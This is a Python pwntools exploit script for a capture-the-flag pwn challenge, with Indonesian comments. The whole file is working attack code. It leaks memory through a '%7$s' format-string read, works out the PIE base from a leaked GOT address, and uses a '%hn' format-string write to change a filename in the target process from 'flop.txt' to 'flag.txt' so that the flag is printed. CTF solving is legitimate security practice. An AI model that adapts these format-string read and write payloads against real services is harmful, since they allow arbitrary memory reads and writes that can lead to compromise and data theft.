#!/usr/bin/env python3

from pathlib import Path
from pwn import *

BASE_DIR = Path(__file__).resolve().parent
context.arch = "amd64"
context.log_level = "info"

HOST = args.HOST or "challs.scriptsorcerers.xyz"
PORT = int(args.PORT or 10003)


def start():
    if args.REMOTE or not args.LOCAL:
        return remote(HOST, PORT, timeout=5)
    raise RuntimeError("Tidak ada binary lokal di direktori challenge.")


def recv_prompt(io):
    return io.recvuntil(b"Enter input: ", timeout=5)


def leak_at(io, address):
    # fgets() hanya menerima 15 byte efektif. Tujuh byte alamat cukup karena
    # byte paling tinggi alamat userspace bernilai nol.
    payload = b"%7$sAAA".ljust(8, b"A") + p64(address)
    io.sendline(payload)
    data = io.recvuntil(b"Enter input: ", timeout=5)
    return data.split(b"AAAA", 1)[0]


def leak_pointer(io, address):
    data = leak_at(io, address)
    return u64(data[:8].ljust(8, b"\0"))


def exploit(io):
    banner = recv_prompt(io)
    gift = int(banner.split(b"0x", 1)[1].split(b"\n", 1)[0], 16)
    log.info("gift/stdin GOT: %#x", gift)

    # gift = PIE+0x4030, sedangkan "flop.txt" berada pada PIE+0x4010.
    # 0x6761 ditulis ke filename+2 sehingga menjadi "flag.txt".
    target = gift - 0x1e
    payload = b"FSOP%26461c%8$hn" + p64(target)
    assert len(payload) == 24
    log.info("PIE base: %#x", gift - 0x4030)
    log.info("filename target: %#x", target)
    io.sendline(payload)
    output = io.recvrepeat(5)
    marker = b"Data: "
    if marker not in output:
        raise RuntimeError(f"output tidak mengandung {marker!r}: {output!r}")
    flag = output.split(marker, 1)[1].split(b"\n", 1)[0].strip()
    if b"{" not in flag or b"}" not in flag:
        raise RuntimeError(f"data bukan flag valid: {flag!r}")
    log.success("FLAG: %s", flag.decode(errors="replace"))
    return flag


def main():
    io = start()
    try:
        exploit(io)
    finally:
        io.close()


if __name__ == "__main__":
    main()
